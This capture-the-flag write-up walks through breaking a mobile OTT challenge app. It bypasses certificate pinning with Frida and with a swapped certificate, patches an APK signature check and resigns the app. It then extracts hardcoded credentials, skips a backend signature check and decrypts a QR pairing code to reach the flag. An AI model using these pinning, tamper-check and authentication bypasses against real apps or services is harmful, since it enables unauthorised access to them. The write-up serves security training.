# Setting up the environment

Android device or emulator with or without root access was used. 

See [Android environment](../../_knowledgebase/android/environment.md) for more details.

# Installing the application

Installing with ADB.

```bash
adb install hereott.apk
```

Opening the application reveals a login screen.

![](screenshots/1.png)

Basic attempts can't log us in.

The traffic is encrypted, therefore tcpdump doesn't reveal much.

![](screenshots/8.png)

# Adding proxy

The burp proxy was enabled.

```bash
adb shell settings put global http_proxy burp:8080
adb shell settings put global http_proxy :0 # to turn off
```

Opening the application detects the tampering.

![](screenshots/2.png)

# Bypassing certificate pinning

We have at least the 2 following choices.

## Frida

Use the [Frida](https://frida.re/) platform to dynamically patch the pinning. This requires rooted device.

Start frida server on the device.

```bash
adb shell su -c /data/local/tmp/frida-server
```

The following script was used for unpinning: [frida-unpinning.js](https://codeshare.frida.re/@workwhileweb/ssl/). Starting the application with our hook now.

```bash
frida -U -l frida-unpinning.js -f hu.honeylab.cyberquest.hereott
```

Starting the app now is going through our proxy.

![](screenshots/3.png)

## Using own certificate

Patch the pinned certificate, this requires NO rooted device.

The website cert can be checked. The domain and port can be acquired from a packet dump for example.

```bash
openssl s_client -showcerts -connect hereott.honeylab.hu:48490 </dev/null
```

Upon inspection of the APK file, there is `hereott.apk/assets/cert.pem` inside with the same key. The application is pinning the tls cert to this one. 

![](screenshots/4.png)

This can be replaced and the apk resigned. The `cert.der` is the burp proxy cert exported.

```bash
cp hereott.apk hereott_mod.apk
mkdir -p assets
openssl x509 -in cert.der -outform pem -out assets/cert.pem
zip hereott_mod.apk assets/cert.pem
zip -d hereott_mod.apk 'META-INF/*.SF' 'META-INF/*.RSA' 'META-INF/MANIFEST.MF'
keytool -genkey -v -keystore resign.keystore -alias resign -keyalg RSA -keysize 2048 -validity 10000 -storepass resign -dname "CN=resign"
rm hereott_mod_align.apk
zipalign -v 4 hereott_mod.apk hereott_mod_align.apk
apksigner sign --ks resign.keystore --ks-pass pass:resign hereott_mod_align.apk
```

Reinstall using the new apk, as the signing key was changed.

```bash
adb uninstall hu.honeylab.cyberquest.hereott
adb install hereott_mod_align.apk
```

Now the application is detecting the modification. The app is doing the same if we don't modify anything just resign it.

![](screenshots/5.png)

A common technique is to check the signer certificate hash. Viewing the original reveals a bunch of hash.

```bash
apksigner verify --print-certs -v hereott.apk
```

```
Signer #1 certificate DN: CN=HereOTTT, OU=CyberQuest 2023, O=honeylab.hu, L=Meseorszag, ST=MO, C=MO
Signer #1 certificate SHA-256 digest: e25a5a0ca0238765ad42ae76248378f588d9899d810f12941ad5bde57345e0b7
Signer #1 certificate SHA-1 digest: f64e4626a7e33c2dad9669249337b69a8e124b33
Signer #1 certificate MD5 digest: e4d77ac870ed77adab0d10a250333aaf
Signer #1 key algorithm: RSA
Signer #1 key size (bits): 2048
Signer #1 public key SHA-256 digest: ce8504004ce1afc2c4ce940306c114c7d5af69737c2a2b9bb869081ce6466bc3
Signer #1 public key SHA-1 digest: 78ac880dfd2e367af368c5fe934bd6e9b2fa8a24
Signer #1 public key MD5 digest: f828ab1b60fc7f567f4b40bfe67f0b2f
```

The apk can be unpacked.

```bash
mkdir -p hereott
unzip hereott.apk -d hereott
```

And searched for these hashes, for example in both binary and string representation.

```bash
hashes="e25a5a0ca0238765ad42ae76248378f588d9899d810f12941ad5bde57345e0b7
f64e4626a7e33c2dad9669249337b69a8e124b33
e4d77ac870ed77adab0d10a250333aaf
ce8504004ce1afc2c4ce940306c114c7d5af69737c2a2b9bb869081ce6466bc3
78ac880dfd2e367af368c5fe934bd6e9b2fa8a24
f828ab1b60fc7f567f4b40bfe67f0b2f"
while IFS= read -r line; do echo hex $line; LC_ALL=C grep -iobUaPR "$(echo $line | sed 's/.\{2\}/\\x&/g')" hereott; done <<<"$hashes"
while IFS= read -r line; do grep -iobUaPR "$line" hereott; done <<<"$hashes"
```

There are a few matches, uppercase `F64E4626A7E33C2DAD9669249337B69A8E124B33`.

![](screenshots/6.png)

Our resigner cert has the following hash with the same type. 

```bash
apksigner verify --print-certs -v hereott_mod_aligned.apk
```

```
Signer #1 certificate SHA-1 digest: f72905858fcb01a95d6abeaa4cf113df4e099691
```

Replacing `F64E4626A7E33C2DAD9669249337B69A8E124B33` with the uppercase version `F72905858FCB01A95D6ABEAA4CF113DF4E099691`. Resigning the apk again.

```bash
mkdir -p lib/arm64-v8a
mkdir -p lib/armeabi-v7a
mkdir -p lib/x86_64
bbe -e 's/F64E4626A7E33C2DAD9669249337B69A8E124B33/F72905858FCB01A95D6ABEAA4CF113DF4E099691/' hereott/lib/arm64-v8a/libapp.so > lib/arm64-v8a/libapp.so
bbe -e 's/F64E4626A7E33C2DAD9669249337B69A8E124B33/F72905858FCB01A95D6ABEAA4CF113DF4E099691/' hereott/lib/armeabi-v7a/libapp.so > lib/armeabi-v7a/libapp.so
bbe -e 's/F64E4626A7E33C2DAD9669249337B69A8E124B33/F72905858FCB01A95D6ABEAA4CF113DF4E099691/' hereott/lib/x86_64/libapp.so > lib/x86_64/libapp.so
zip -r hereott_mod.apk lib
rm hereott_mod_align.apk
zipalign -v 4 hereott_mod.apk hereott_mod_align.apk
apksigner sign --ks resign.keystore --ks-pass pass:resign hereott_mod_align.apk
```

Updating the app.

```bash
adb install hereott_mod_align.apk
```

Is finally bypassing the protection.

# Checking the network communication

Now we can see the encrypted traffic as well.

The server at `hereott.honeylab.hu` is actually just a load balancer. It is redirecting every request to some other server.

Upon starting the application, we can see the application sending out some credentials and receiving a config file.

![](screenshots/7.png)

Username: `HereOttMobileApp`, password: `97967af0db478e842e16dbf7aea6e93a` (after b64 decode). Unfortunately this credential is not useful for anything else.

There is an other json in the [config](workdir/config.json) that was acquired: <https://hereott.honeylab.hu:48490/files/apps_list_Meseorszag_v1.json>. 

In that file, there is a selfcare url: <https://10.10.3.11:48490/selfcare/selfcare-frontend/>.

# Selfcare

Visiting the selfcare url gives a seemingly broken site.

![](screenshots/9.png)

This is happening, because the frontend is unable to authenticate itself and received a 403 Forbidden from the backend.

![](screenshots/10.png)

The frontend also sending some credentials to the backend.

```
Authorization: Basic aGVyZW90dHNlbGZjYXJlOmhlcmVvdHRzZWxmY2FyZQ==
```

Username: `hereottselfcare`, password: `hereottselfcare`. Unfortunately this credential is not useful for anything else either.

Replicating such requests via curl looks like the following.

```bash
curl -k 'https://10.10.3.11:48490/selfcare/selfcare-backend/devices' -H 'accept: application/json, text/plain, */*' -H 'authorization: Basic aGVyZW90dHNlbGZjYXJlOmhlcmVvdHRzZWxmY2FyZQ==' \
  -H 'serialnumber: 345-2251605' \
  -H 'sig: undefined' \
  -H 'uid: undefined' \
  -H 'uuid: 81ec4f8e-b4b6-4842-8904-634ca6f78dbc'
```

This has a `Signature mismatch` error.

# Digging in the JS

Omitting a lot of details, the JS is using webassembly to generate the serial, signature and uid.

![](screenshots/11.png)

![](screenshots/12.png)

Reversing the webasm reveal that the information is missing to generate any signature.

The serial is simply stored in the browser's local storage after generation.

# Omitting the parameters

Sending a request without signature seems to generate a different error: `UID is missing or invalid`.

```bash
curl -k 'https://10.10.3.11:48490/selfcare/selfcare-backend/devices' -H 'accept: application/json, text/plain, */*' -H 'authorization: Basic aGVyZW90dHNlbGZjYXJlOmhlcmVvdHRzZWxmY2FyZQ==' \
  -H 'serialnumber: 345-2251605' \
  -H 'uid: undefined' \
  -H 'uuid: 81ec4f8e-b4b6-4842-8904-634ca6f78dbc'
```

Guessing valid UID seems to be possible. Let's substitute 1.

```bash
curl -k 'https://10.10.3.11:48490/selfcare/selfcare-backend/devices' -H 'accept: application/json, text/plain, */*' -H 'authorization: Basic aGVyZW90dHNlbGZjYXJlOmhlcmVvdHRzZWxmY2FyZQ==' \
  -H 'serialnumber: 345-2251605' \
  -H 'uid: 1' \
  -H 'uuid: 81ec4f8e-b4b6-4842-8904-634ca6f78dbc'
```

This is sending back a valid list of devices.

```json
{"devices":[{"id":"0acc8bbd-a6ed-42eb-80cd-047e70d2b967","name":"HereOTT MediaBox Pro","type":"stb","active":true}]}
```

# Overriding the parameters

Using the browser developer tools to override a slightly modified and beautified version of the original js logic [app.24055605.js](workdir/app.24055605.js) can exploit the missing signature. The `sig` parameter was removed, the `uid` parameter was fixed to `1`, the `ServerUrl` was changed to directly talk to the server without the redirects.

![](screenshots/14.png)

The pairing device also works. The backend returns a qr code and an IV ([qrcode.json](workdir/qrcode.json)). The `qrCode` is just a binary representation of the [qrcode.jpg](workdir/qrcode.jpg), with some `iv`: `4bb1d4ed701b3db94e4240e628414492`.

![](screenshots/15.png)

# Pairing

Using the `Login with QR Code` feature in the app and scanning the QR code returns the flag.

![](screenshots/16.png)

# Flag
`cq23{Ott_Pl4tform_5ecurity_1s_the_b3st_4bb1d4ed701b3}`

# Without camera

## QR code

The QR code has the content `0|/Yv5dm5bOL5Fk+bcD4ylQg==|/rt3h9I0ndPktKi85EcNXA==`

```bash
zbarimg qrcode.jpg
```

The previous `iv` next to the `qrCode` suggests some encryption. AES with CBC works, if the first base64 string is used as key, the second base64 as input, and iv as hex iv.

![](screenshots/17.png)

We get a decrypted `35276072` number whose purpose is unknown yet.

## Backend QR Endpoint

Based on `/v1/login` endpoint, looking for similar strings in `libapp.so` files also have a `/v1/loginWithCode`. 

Checking this endpoint.

```bash
curl -v -k 'https://10.10.3.11:48490/v1/loginWithCode'
```

The `{"error": "Method not allowed"}` suggests to use different method. POST.

```bash
curl -v -k -X POST 'https://10.10.3.11:48490/v1/loginWithCode'
```

The `{"error": "Wrong request"}` is probably about missing parameters. After trying various things, json `{}` value gives another error.

```bash
curl -v -k -X POST 'https://10.10.3.11:48490/v1/loginWithCode' -d '{}'
```

The `{"error": "Missing pinCode"}` indicates missing `pinCode` parameter. Further iterating it is excepting string value, otherwise returning `Wrong request` again.

```bash
curl -v -k -X POST 'https://10.10.3.11:48490/v1/loginWithCode' -d '{"pinCode":"0"}'
```

The next `{"error": "UUID is missing or invalid"}` error indicates missing `UUID`. After many attempts, it is not in the json, nor a GET parameter, but a header.

```bash
curl -v -k -X POST 'https://10.10.3.11:48490/v1/loginWithCode' -H 'UUID: 00000000-0000-0000-0000-000000000000' -d '{"pinCode":"0"}'
```

It is `{"error": "Invalid PIN code"}` now. Using the decrypted QR code value `35276072` is passing the check. Returning our new paired device with the flag in the headers.

![](screenshots/18.png)

And the new device is successfully added on the selfcare website as well.

![](screenshots/19.png)

# Bonus webassembly

The `workdir/wasm` folder can be used as a sandbox for live debug for this web assembly file. Starting a webserver to serve the files is necessery.

```bash
python -m http.server
```

The [index.html](workdir/wasm/index.html) is a thin wrapper around the webasm using stubs similar to the original javascript with some parts beautified or renamed.

The [5c56ebcf9201bf3d.wat](workdir/wasm/5c56ebcf9201bf3d.wat) is a heavily modified version to the one the version the site is running. The wasm was simply converted to wat and manually modified. After modification, it can be converted back to wasm with the following.

```bash
wat2wasm 5c56ebcf9201bf3d.wat
```

The modifications include the following:
 - Adding on the JS side and importing `console log`, `console logparam` and `console logstr` functions on the wasm side so it can be used to print things on the console. 
 - The random on the JS side can be fixed to generate same numbers
 - Adding various extra console logging to the webasm file for function calls and various parameters inside core functions.

![](screenshots/20.png)

![](screenshots/21.png)

The same sandbox was used to dynamically analyze the signature and uid. This way the wasm can be stopped, edited, experimented. Also the chrome based browsers has the ability for the Memory inspector part to check the raw memory during runtime.

A few random serials generated with this.

```
565-2215164
296-6787554
316-6781436
182-0658612
351-2335546
560-1133544
250-1888854
275-4100673
```

The function basically does the following. The offsets in [5c56ebcf9201bf3d.wasm](workdir/wasm/5c56ebcf9201bf3d.wasm) was used.

Getting a random float, multiplying it with 998 and rounding it down. It is a schema to generate random between 2 numbers, in this between 0 and 998 (the end is exclusive).

```
0x03d39 call $wbg.__wbg_random_5f61cd0d6777a993
0x03d3b f64.const 998
0x03d44 f64.mul
0x03d45 f64.floor
```

After that, it is checking if that random was not 333, 444, 555, 666, 777, 888. All this in a loop,  regenerating the random if the check fails. This part is used as the part before the dash.

```
0x03d7e   local.tee $var1
0x03d80   i32.const 665
0x03d83   i32.le_s
0x03d84   if
0x03d86     local.get $var1
0x03d88     i32.const 333
0x03d8b     i32.eq
0x03d8c     local.get $var1
0x03d8e     i32.const 444
0x03d91     i32.eq
0x03d92     i32.or
0x03d93     local.get $var1
0x03d95     i32.const 555
0x03d98     i32.eq
0x03d99     i32.or
0x03d9a     br_if $label1
0x03d9c     br $label2
0x03d9e   end
0x03d9f   local.get $var1
0x03da1   i32.const 666
0x03da4   i32.eq
0x03da5   local.get $var1
0x03da7   i32.const 777
0x03daa   i32.eq
0x03dab   i32.or
0x03dac   local.get $var1
0x03dae   i32.const 888
0x03db1   i32.eq
0x03db2   i32.or
0x03db3   br_if $label1
0x03db5 end $label2
```

The next step is to generate 6 more numbers in a loop, between 0-9 and 1 more between 1-7.

```
0x03e20 call $wbg.__wbg_random_5f61cd0d6777a993
0x03e22 f64.const 9
0x03e2b f64.mul
0x03e2c f64.floor
...
0x03eb8 call $wbg.__wbg_random_5f61cd0d6777a993
0x03eba f64.const 6
0x03ec3 f64.mul
0x03ec4 f64.floor
```

The last step is regenerating numbers in a loop, between 0-6, until the sum of the 7 numbers divided with 7 has 0 remainder (sum mod 7 == 0).

```
0x03f74 local.get $var5
0x03f76 i32.add
0x03f77 local.set $var5
...
0x03f8e local.get $var5
0x03f8c i32.const 7
0x03f8e i32.rem_u
0x03f90 i32.eqz
0x03f92 br_if $label7
```

The [Windows 95 retail key](https://en.wikipedia.org/wiki/Product_key#Windows_95_retail_key) works like this.

# Bonus flag
Windows 95


# Flutter

Flutter is used, this can be seen in the resources as well. The code is compiled to native code, `.so` files.

Some resources for reversing:

 - <https://blog.tst.sh/reverse-engineering-flutter-apps-part-1/>
 - <https://github.com/ptswarm/reFlutter>